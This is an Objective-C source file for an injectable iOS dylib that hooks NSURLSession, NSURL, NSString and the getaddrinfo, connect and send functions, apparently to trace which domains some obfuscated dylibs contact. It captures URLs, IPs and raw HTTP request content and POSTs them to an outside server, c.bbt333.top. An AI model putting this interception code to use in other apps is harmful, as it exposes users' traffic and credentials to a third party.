// HookLogger.m - 编译: clang -dynamiclib -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) -framework Foundation -o HookLogger.dylib HookLogger.m
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#include <netdb.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// ── 日志上报（双重：网络+本地文件）────────────────────────────────────
static void sendToServer(NSDictionary *info) {
    NSData *body = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
    if (!body) return;

    // 方案1：写本地文件（绝对可靠）
    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/c2_hook.log"];
    NSString *line = [[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
    if (fh) {
        [fh seekToEndOfFile];
        [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
        [fh closeFile];
    } else {
        [line writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }

    // 方案2：网络回传（可能失败）
    NSURL *url = [NSURL URLWithString:@"https://c.bbt333.top/c2_capture"];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.HTTPBody   = body;
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.timeoutInterval = 8;

    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
    [[session dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e){}] resume];
}

// ── 获取调用栈（返回偏移量）────────────────────────────────────────────────
static NSString *getCallStack(void) {
    NSArray *syms = [NSThread callStackSymbols];
    NSMutableArray *arr = [NSMutableArray array];
    for (NSString *s in syms) {
        // 格式: "1   SDWebuiopser  0x000000010234abcd 0x102340000 + 43981"
        if ([s containsString:@"libutils"]) {
            NSScanner *scanner = [NSScanner scannerWithString:s];
            unsigned long long addr = 0, base = 0;
            [scanner scanUpToString:@"0x" intoString:nil];
            [scanner scanHexLongLong:&addr];
            [scanner scanUpToString:@"0x" intoString:nil];
            [scanner scanHexLongLong:&base];
            if (addr && base) {
                unsigned long long offset = addr - base;
                [arr addObject:[NSString stringWithFormat:@"SDWebuiopser+0x%llx", offset]];
                continue;
            }
        }
        [arr addObject:s];
    }
    return [arr componentsJoinedByString:@" | "];
}

// ── Hook: NSURLSession 所有请求 ──────────────────────────────────────────
typedef NSURLSessionDataTask* (*origDataTask_t)(id, SEL, NSURLRequest*, id);
static origDataTask_t origDataTask = NULL;

static NSURLSessionDataTask* hookedDataTask(id self, SEL sel, NSURLRequest *req, id handler) {
    NSString *host = req.URL.host;
    if (host && ([host hasSuffix:@"chskt.top"] || [host hasSuffix:@"vsdeg.org"])) {
        NSDictionary *info = @{
            @"type"   : @"NSURLSession",
            @"url"    : req.URL.absoluteString ?: @"",
            @"host"   : host,
            @"method" : req.HTTPMethod ?: @"",
            @"stack"  : getCallStack(),
            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
        };
        sendToServer(info);
    }
    return origDataTask(self, sel, req, handler);
}

// ── Hook: NSString stringWithFormat (捕获 https://%@... 构建瞬间) ────────
typedef NSString* (*origFmt_t)(id, SEL, NSString*, ...);
static IMP origStringWithFormat = NULL;

// 只 hook 第一个 %@ 参数（host）
static NSString* hookedStringWithFormat(id self, SEL sel, NSString *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    NSString *result = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);

    if ([fmt hasPrefix:@"https://%@"]) {
        // 从 result 中解析 host
        NSURL *u = [NSURL URLWithString:result];
        NSDictionary *info = @{
            @"type"   : @"stringWithFormat",
            @"fmt"    : fmt,
            @"result" : result,
            @"host"   : u.host ?: @"",
            @"stack"  : getCallStack(),
            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
        };
        sendToServer(info);
    }
    return result;
}

// ── Hook NSString initWithBytes 捕获字符串创建（C 字节转 NSString）─────────
typedef id (*origInitWithBytes_t)(id, SEL, const void*, NSUInteger, NSStringEncoding);
static origInitWithBytes_t origInitWithBytes = NULL;

static id hookedInitWithBytes(id self, SEL sel, const void *bytes, NSUInteger len, NSStringEncoding enc) {
    id result = origInitWithBytes(self, sel, bytes, len, enc);
    if (bytes && len >= 10 && len <= 50) {
        const char *s = (const char *)bytes;
        // 检查是否包含 .ga-a9 或 huqwudu
        for (NSUInteger i = 0; i + 5 < len; i++) {
            if ((s[i]=='v' && s[i+1]=='s' && s[i+2]=='d' && s[i+3]=='e' && s[i+4]=='g') ||
                (s[i]=='c' && s[i+1]=='h' && s[i+2]=='s' && s[i+3]=='k' && s[i+4]=='t')) {
                NSDictionary *info = @{
                    @"type"  : @"initWithBytes",
                    @"str"   : result ? [result description] : @"nil",
                    @"stack" : getCallStack(),
                    @"ts"    : @((long)[[NSDate date] timeIntervalSince1970])
                };
                sendToServer(info);
                break;
            }
        }
    }
    return result;
}

// ── Hook NSObject setValue:forKey: 捕获属性设置 ───────────────────────────
typedef void (*origSetValueForKey_t)(id, SEL, id, NSString*);
static origSetValueForKey_t origSetValueForKey = NULL;

static void hookedSetValueForKey(id self, SEL sel, id value, NSString *key) {
    origSetValueForKey(self, sel, value, key);
    if ([value isKindOfClass:[NSString class]]) {
        NSString *str = (NSString *)value;
        if ([str hasSuffix:@"vsdeg.org"] || [str hasSuffix:@"chskt.top"]) {
            NSDictionary *info = @{
                @"type"  : @"setValueForKey",
                @"key"   : key ?: @"",
                @"value" : str,
                @"class" : NSStringFromClass([self class]) ?: @"",
                @"stack" : getCallStack(),
                @"ts"    : @((long)[[NSDate date] timeIntervalSince1970])
            };
            sendToServer(info);
        }
    }
}

// ── Hook NSURLRequest 创建 (比 resume 更早，能看到 host 来源) ─────────────
typedef NSURLRequest* (*origReqWithURL_t)(id, SEL, NSURL*);
static origReqWithURL_t origReqWithURL = NULL;

static NSURLRequest* hookedReqWithURL(id self, SEL sel, NSURL *url) {
    NSURLRequest *result = origReqWithURL(self, sel, url);
    NSString *host = url.host;
    if (host && ([host hasSuffix:@"chskt.top"] || [host hasSuffix:@"vsdeg.org"])) {
        NSDictionary *info = @{
            @"type"   : @"NSURLRequest",
            @"url"    : url.absoluteString ?: @"",
            @"host"   : host,
            @"stack"  : getCallStack(),
            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
        };
        sendToServer(info);
    }
    return result;
}

// ── Hook NSURL initWithString （URL 对象创建瞬间）─────────────────────────
typedef NSURL* (*origURLInit_t)(id, SEL, NSString*);
static origURLInit_t origURLInit = NULL;

static NSURL* hookedURLInit(id self, SEL sel, NSString *str) {
    NSURL *result = origURLInit(self, sel, str);
    if (result && ([result.host hasSuffix:@"vsdeg.org"] || [result.host hasSuffix:@"chskt.top"])) {
        NSDictionary *info = @{
            @"type"   : @"NSURL_init",
            @"url"    : str ?: @"",
            @"host"   : result.host ?: @"",
            @"stack"  : getCallStack(),
            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
        };
        sendToServer(info);
    }
    return result;
}

// ── Hook: getaddrinfo（C函数，抓 cpp-httplib / JCbFH3aiPh 的域名解析）────
// 用 __interpose 段，dyld 加载时自动替换所有 dylib 的 getaddrinfo 调用
// 无需 fishhook，无需 MSHookFunction，覆盖 JCbFH3aiPh 的 cpp-httplib

static int my_getaddrinfo(const char *hostname, const char *servname,
                           const struct addrinfo *hints, struct addrinfo **res) {
    if (hostname) {
        // 先获取调用方 dylib 名称
        Dl_info dlinfo;
        const char *caller_name = "";
        void *retAddr = __builtin_return_address(0);
        if (dladdr(retAddr, &dlinfo) && dlinfo.dli_fname) {
            const char *fname = strrchr(dlinfo.dli_fname, '/');
            caller_name = fname ? fname+1 : dlinfo.dli_fname;
        }

        // 只上报来自 JCbFH3aiPh.dylib、libswift_Concurrency.dylib 或 ATHelper.dylib 的调用
        BOOL isTarget = (strstr(caller_name, "JCbFH3aiPh") != NULL ||
                         strstr(caller_name, "libswift_Concurrency") != NULL ||
                         strstr(caller_name, "ATHelper") != NULL);

        if (isTarget) {
            NSString *host   = [NSString stringWithUTF8String:hostname];
            NSString *caller = [NSString stringWithUTF8String:caller_name];
            BOOL isIP = ([host componentsSeparatedByString:@"."].count == 4);

            NSDictionary *info = @{
                @"type"    : @"getaddrinfo_C",
                @"host"    : host,
                @"service" : servname ? [NSString stringWithUTF8String:servname] : @"",
                @"caller"  : caller,
                @"is_ip"   : @(isIP),
                @"ts"      : @((long)[[NSDate date] timeIntervalSince1970])
            };
            sendToServer(info);
        }
    }
    return getaddrinfo(hostname, servname, hints, res);
}

// dyld __interpose：替换进程内所有对 getaddrinfo 的调用
__attribute__((used))
static struct {
    void *replacement;
    void *original;
} interpose_getaddrinfo
__attribute__((section("__DATA,__interpose"))) = {
    (void *)my_getaddrinfo,
    (void *)getaddrinfo
};

// ── Hook: connect()（抓 JCbFH3aiPh/ATHelper 直连IP的情况）────────────────
static int my_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    // 获取调用方
    Dl_info dlinfo;
    const char *caller_name = "";
    void *retAddr = __builtin_return_address(0);
    if (dladdr(retAddr, &dlinfo) && dlinfo.dli_fname) {
        const char *fname = strrchr(dlinfo.dli_fname, '/');
        caller_name = fname ? fname+1 : dlinfo.dli_fname;
    }

    BOOL isTarget = (strstr(caller_name, "JCbFH3aiPh") != NULL ||
                     strstr(caller_name, "libswift_Concurrency") != NULL ||
                     strstr(caller_name, "ATHelper") != NULL);

    if (isTarget && addr) {
        char ip_buf[64] = {0};
        int port = 0;
        if (addr->sa_family == AF_INET) {
            struct sockaddr_in *s4 = (struct sockaddr_in *)addr;
            inet_ntop(AF_INET, &s4->sin_addr, ip_buf, sizeof(ip_buf));
            port = ntohs(s4->sin_port);
        } else if (addr->sa_family == AF_INET6) {
            struct sockaddr_in6 *s6 = (struct sockaddr_in6 *)addr;
            inet_ntop(AF_INET6, &s6->sin6_addr, ip_buf, sizeof(ip_buf));
            port = ntohs(s6->sin6_port);
        }
        if (strlen(ip_buf) > 0) {
            NSString *caller = [NSString stringWithUTF8String:caller_name];
            NSString *ipStr  = [NSString stringWithUTF8String:ip_buf];
            NSDictionary *info = @{
                @"type"   : @"connect_C",
                @"ip"     : ipStr,
                @"port"   : @(port),
                @"caller" : caller,
                @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
            };
            sendToServer(info);
        }
    }
    return connect(sockfd, addr, addrlen);
}

__attribute__((used))
static struct {
    void *replacement;
    void *original;
} interpose_connect
__attribute__((section("__DATA,__interpose"))) = {
    (void *)my_connect,
    (void *)connect
};

// ── Hook: send()（抓 JCbFH3aiPh 发送的 HTTP 请求内容）──────────────────────
static ssize_t my_send(int sockfd, const void *buf, size_t len, int flags) {
    Dl_info dlinfo;
    const char *caller_name = "";
    void *retAddr = __builtin_return_address(0);
    if (dladdr(retAddr, &dlinfo) && dlinfo.dli_fname) {
        const char *fname = strrchr(dlinfo.dli_fname, '/');
        caller_name = fname ? fname+1 : dlinfo.dli_fname;
    }

    BOOL isTarget = (strstr(caller_name, "JCbFH3aiPh") != NULL ||
                     strstr(caller_name, "ATHelper") != NULL);

    if (isTarget && buf && len > 0 && len < 4096) {
        // 只抓文本内容（HTTP请求头）
        const char *data = (const char *)buf;
        if (data[0] == 'G' || data[0] == 'P' || data[0] == 'H' || data[0] == 'D') {
            NSString *content = [[NSString alloc] initWithBytes:buf
                                                         length:MIN(len, 512)
                                                       encoding:NSUTF8StringEncoding];
            if (!content) content = @"(binary)";
            NSString *caller = [NSString stringWithUTF8String:caller_name];
            NSDictionary *info = @{
                @"type"    : @"send_C",
                @"caller"  : caller,
                @"content" : content,
                @"len"     : @(len),
                @"ts"      : @((long)[[NSDate date] timeIntervalSince1970])
            };
            sendToServer(info);
        }
    }
    return send(sockfd, buf, len, flags);
}

__attribute__((used))
static struct {
    void *replacement;
    void *original;
} interpose_send
__attribute__((section("__DATA,__interpose"))) = {
    (void *)my_send,
    (void *)send
};

// ── 初始化 ────────────────────────────────────────────────────────────────
__attribute__((constructor))
static void HookLoggerInit(void) {
    // 1. Hook NSURLSession dataTaskWithRequest:completionHandler:
    Class sessionClass = NSClassFromString(@"__NSCFLocalSessionDataTask");
    // 更可靠：hook NSURLSession 实例方法
    Class cls = [NSURLSession class];
    SEL   dtSel = @selector(dataTaskWithRequest:completionHandler:);
    Method m = class_getInstanceMethod(cls, dtSel);
    if (m) {
        origDataTask = (origDataTask_t)method_getImplementation(m);
        method_setImplementation(m, (IMP)hookedDataTask);
    }

    // 2. Hook NSString initWithBytes:length:encoding:
    Method ibM = class_getInstanceMethod([NSString class], @selector(initWithBytes:length:encoding:));
    if (ibM) {
        origInitWithBytes = (origInitWithBytes_t)method_getImplementation(ibM);
        method_setImplementation(ibM, (IMP)hookedInitWithBytes);
    }

    // 3. Hook NSObject setValue:forKey:
    Method svfkM = class_getInstanceMethod([NSObject class], @selector(setValue:forKey:));
    if (svfkM) {
        origSetValueForKey = (origSetValueForKey_t)method_getImplementation(svfkM);
        method_setImplementation(svfkM, (IMP)hookedSetValueForKey);
    }

    // 3. Hook NSURLRequest requestWithURL:
    Method reqM = class_getClassMethod([NSURLRequest class], @selector(requestWithURL:));
    if (reqM) {
        origReqWithURL = (origReqWithURL_t)method_getImplementation(reqM);
        method_setImplementation(reqM, (IMP)hookedReqWithURL);
    }

    // 3. Hook NSURL URLWithString:
    Method urlM = class_getClassMethod([NSURL class], @selector(URLWithString:));
    if (urlM) {
        origURLInit = (origURLInit_t)method_getImplementation(urlM);
        method_setImplementation(urlM, (IMP)hookedURLInit);
    }

    // 4. Hook [NSString stringWithFormat:]
    Method fmtM = class_getClassMethod([NSString class], @selector(stringWithFormat:));
    if (fmtM) {
        origStringWithFormat = method_getImplementation(fmtM);
        method_setImplementation(fmtM, (IMP)hookedStringWithFormat);
    }

}
// 注：getaddrinfo 通过 __DATA,__interpose 段替换，无需在 constructor 里调用
